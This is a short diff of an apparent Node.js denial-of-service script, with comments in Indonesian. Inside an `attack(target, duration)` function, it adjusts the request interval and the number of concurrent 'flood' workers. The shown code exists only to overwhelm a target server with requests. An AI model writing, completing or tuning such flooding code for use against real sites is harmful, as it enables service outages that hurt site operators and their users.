@@ -77,14 +77,14 @@ const attack = async (target, duration) => {
           });
           req.on('response', () => req.close());
           req.end();
-        }, 3); // interval 5ms
+        }, 5); // interval 5ms
       });
     } catch (e) {
       // error handling jika diperlukan
     }
   };
 
-  const workerCount = 500; // jumlah worker lebih tinggi
+  const workerCount = 200; // jumlah worker lebih tinggi
   const workers = Array.from({ length: workerCount }, () => flood());
   await Promise.all(workers);
 
